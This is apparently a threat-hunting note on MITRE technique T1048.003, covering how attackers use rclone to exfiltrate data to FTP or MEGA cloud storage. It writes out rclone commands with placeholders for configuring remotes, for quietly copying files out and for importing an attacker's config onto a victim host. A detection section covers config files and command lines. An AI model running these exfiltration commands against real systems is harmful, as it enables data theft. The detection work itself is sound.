# T1048.003 - Exfiltration Over Alternative Protocol Rclone FTP

## Description

Threat actor can utilize rclone to exfiltrate data in a stealthy manner as it can micro on the trasfer bandwidth etc.

It does support alot of providers besides MEGA cloud.

Click [here](https://rclone.org/#providers) for more info.

## Local FTP Creation

Basically refer to the technique mentioned in [atomic red team](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.md#atomic-test-7---exfiltration-over-alternative-protocol---ftp---rclone)

### Create a local FTP host

```cmd
rclone config create <FTP_HOST_FOLDER> "ftp" "host" <HOST_NAME> "port" <HOST_PORT> "user" <HOST_USER_NAME> "pass" <HOST_PASSWORD>
```

> ftpserver is the folder that hosted by the local FTP server.

### Transer file into the local FTP host created

```cmd
rclone copy --max-age 2y <FILE_NAME> <FTP_HOST_FOLDER> --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate
```

## Remote FTP/Cloud Storage

### Create config file locally (MEGA cloud storage)

```cmd
rclone config create remote mega "user" <MEGA_USER_EMAIL> "pass" <MEGA_USER_PASSWORD>
```

It will create a config file named `rclone.conf` in default folder `<DRIVE_LETTER>:\Users\<USER_NAME>\AppData\Roaming\rclone\rclone.conf`

### Explicit config file import

This may happens when attack import their own config into victim host.

Config file can be explicitly fetch via `--config` switch

```cmd
rclone --config=test.conf copy <LOCAL_FOLDER/FILE> remote:<REMOTE_FOLDER_PATH>

e.g.
rclone --config=test.conf copy FILE.txt remote:/FOLDER
```

Transfer local file into the cloud storage.

```cmd
rclone --config=test.conf copy README.txt remote:/lol
```

## Hunt

### Config File

Usually There will have `FileCreate` event on `rclone.conf` after execute the command above.

Search for rclone config file:

- Default folder path (Have to be default name)
- Config file which located in same folder with the rclone binary (Have to be default name)
- Config file mentioned as parameter in `--config` switch (File name can be vary)

Config file at least contains name of the provider used, user account name and the encrypted password.

### File exfiltration

Check for specific keyword such as `copy` in the command line used.

### Network

It might be vary for different provider used.

## References

<https://attack.mitre.org/techniques/T1567/003/>  
<https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/>  
<https://rclone.org/mega/>
